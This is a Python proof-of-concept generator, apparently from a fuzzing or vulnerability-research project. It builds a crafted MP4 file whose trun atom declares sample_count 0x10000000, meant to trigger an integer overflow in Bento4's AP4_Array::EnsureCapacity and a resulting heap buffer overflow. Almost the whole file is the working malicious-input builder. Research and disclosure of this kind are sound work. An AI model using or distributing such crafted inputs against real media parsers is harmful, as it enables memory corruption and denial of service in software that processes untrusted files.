#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Integer Overflow in AP4_Array::EnsureCapacity via Crafted trun atom sample_count -> Heap Buffer Overflow

Builds a crafted MP4 with moof/traf/trun where sample_count = 0x10000000 to trigger
the integer overflow in AP4_Array<T>::EnsureCapacity.
"""
import struct
import os

def box(type4, data=b''):
    return struct.pack('>I4s', 8 + len(data), type4.encode()) + data

def fullbox(type4, version, flags, data=b''):
    hdr = struct.pack('B', version) + struct.pack('>I', flags)[1:]  # 1B version + 3B flags
    return box(type4, hdr + data)

# ftyp box (24 bytes)
ftyp_data = b'isom' + struct.pack('>I', 0) + b'isom' + b'iso5' + b'iso6' + b'mp41'
ftyp = box('ftyp', ftyp_data)

# mvhd (version=0)
mvhd_data = struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000)  # ctime,mtime,timescale,duration,rate
mvhd_data += struct.pack('>H', 0x0100)  # volume
mvhd_data += b'\x00' * 10  # reserved
mvhd_data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix
mvhd_data += b'\x00' * 24  # pre_defined
mvhd_data += struct.pack('>I', 2)  # next_track_id
mvhd = fullbox('mvhd', 0, 0, mvhd_data)

# tkhd (version=0, flags=3 = track enabled + in movie)
tkhd_data = struct.pack('>IIIII', 0, 0, 1, 0, 0)  # ctime,mtime,track_id,reserved,duration
tkhd_data += b'\x00' * 8 + struct.pack('>HH', 0, 0)  # reserved, layer, alternate_group
tkhd_data += struct.pack('>HH', 0x0100, 0)  # volume, reserved
tkhd_data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix
tkhd_data += struct.pack('>II', 0, 0)  # width, height
tkhd = fullbox('tkhd', 0, 3, tkhd_data)

# mdhd (version=0): ctime,mtime,timescale,duration,language+predefined
mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0)  # ctime,mtime,timescale,duration
mdhd_data += struct.pack('>HH', 0, 0)  # language, pre_defined
mdhd = fullbox('mdhd', 0, 0, mdhd_data)

# hdlr: pre_defined(4), handler_type(4='soun'), reserved(12), name(null-terminated)
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00' * 12 + b'Sound\x00'
hdlr = fullbox('hdlr', 0, 0, hdlr_data)

# smhd (sound media header): balance(2) + reserved(2)
smhd_data = struct.pack('>HH', 0, 0)
smhd = fullbox('smhd', 0, 0, smhd_data)

# dinf/dref
url_data = b''  # self-contained
url = fullbox('url ', 0, 1, url_data)  # flags=1 means self-contained
dref_data = struct.pack('>I', 1) + url  # entry_count=1
dref = fullbox('dref', 0, 0, dref_data)
dinf = box('dinf', dref)

# stbl - stsd with minimal mp4a entry so GetSampleDescription(0) returns non-NULL
# mp4a sample entry:
#   6 bytes reserved + 2 bytes data-reference-index=1
#   8 bytes reserved + 2 channelcount=2 + 2 samplesize=16 + 2 pre_defined + 2 reserved
#   4 bytes samplerate (44100 << 16)
# esds box (minimal): version(1)+flags(3) + ES_Descriptor
# Minimal ESDescriptor for AAC LC at 44100Hz stereo
def make_esds():
    # DecoderSpecificInfo for AAC LC, 44100Hz, 2ch: 0x1210
    dsi = bytes([0x12, 0x10])
    # DecoderConfigDescriptor: objectTypeIndication=0x40(AAC), streamType=0x15 (audio<<2|1)
    # bufferSize=0, maxBitrate=0, avgBitrate=0, then DecoderSpecificInfo
    dci_tag = 0x04
    dsi_tag = 0x05
    dsi_desc = bytes([dsi_tag, len(dsi)]) + dsi
    dci_payload = bytes([0x40, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) + dsi_desc
    dci_desc = bytes([dci_tag, len(dci_payload)]) + dci_payload
    # SLConfigDescriptor: predefined=0x02
    slc_tag = 0x06
    slc_desc = bytes([slc_tag, 0x01, 0x02])
    # ES_Descriptor: ES_ID=1, flags=0
    es_tag = 0x03
    es_payload = struct.pack('>H', 1) + bytes([0x00]) + dci_desc + slc_desc
    es_desc = bytes([es_tag, len(es_payload)]) + es_payload
    return fullbox('esds', 0, 0, es_desc)

esds = make_esds()
mp4a_data  = b'\x00' * 6 + struct.pack('>H', 1)  # reserved(6) + data-ref-idx(2)=1
mp4a_data += b'\x00' * 8                          # reserved(8)
mp4a_data += struct.pack('>HH', 2, 16)            # channelcount=2, samplesize=16
mp4a_data += struct.pack('>HH', 0, 0)             # pre_defined=0, reserved=0
mp4a_data += struct.pack('>I', 44100 << 16)       # samplerate (fixed-point 16.16)
mp4a_data += esds
mp4a_box   = box('mp4a', mp4a_data)
stsd_data  = struct.pack('>I', 1) + mp4a_box      # entry_count=1
stsd = fullbox('stsd', 0, 0, stsd_data)
stts_data = struct.pack('>I', 0)  # entry_count=0
stts = fullbox('stts', 0, 0, stts_data)
stsc_data = struct.pack('>I', 0)
stsc = fullbox('stsc', 0, 0, stsc_data)
stsz_data = struct.pack('>II', 0, 0)  # sample_size=0, sample_count=0
stsz = fullbox('stsz', 0, 0, stsz_data)
stco_data = struct.pack('>I', 0)
stco = fullbox('stco', 0, 0, stco_data)
stbl = box('stbl', stsd + stts + stsc + stsz + stco)

minf = box('minf', smhd + dinf + stbl)
mdia = box('mdia', mdhd + hdlr + minf)
trak = box('trak', tkhd + mdia)

# trex (track extends)
trex_data = struct.pack('>IIIII', 1, 1, 0, 0, 0)  # track_ID, default_sample_description_index, ...
trex = fullbox('trex', 0, 0, trex_data)
mvex = box('mvex', trex)

moov = box('moov', mvhd + trak + mvex)

# moof box
mfhd_data = struct.pack('>I', 1)  # sequence_number=1
mfhd = fullbox('mfhd', 0, 0, mfhd_data)

# tfhd (flags=0x020000 = default-base-is-moof)
tfhd_data = struct.pack('>I', 1)  # track_ID=1
tfhd = fullbox('tfhd', 0, 0x020000, tfhd_data)

# trun - THE VULNERABILITY TRIGGER
# version=0, flags=0, sample_count=0x10000000
# No optional per-sample data fields (flags=0 means none present)
trun_data = struct.pack('>I', 0x10000000)  # sample_count = 268435456
trun = fullbox('trun', 0, 0, trun_data)

traf = box('traf', tfhd + trun)
moof = box('moof', mfhd + traf)

# mdat (empty)
mdat = box('mdat')

# Assemble MP4
mp4 = ftyp + moov + moof + mdat

out_dir = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4FragmentSampleTable_h/'
out_path = os.path.join(out_dir, 'vuln_001.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4)

print(f"Written {len(mp4)} bytes to {out_path}")
print(f"sample_count in trun = 0x10000000 = {0x10000000}")
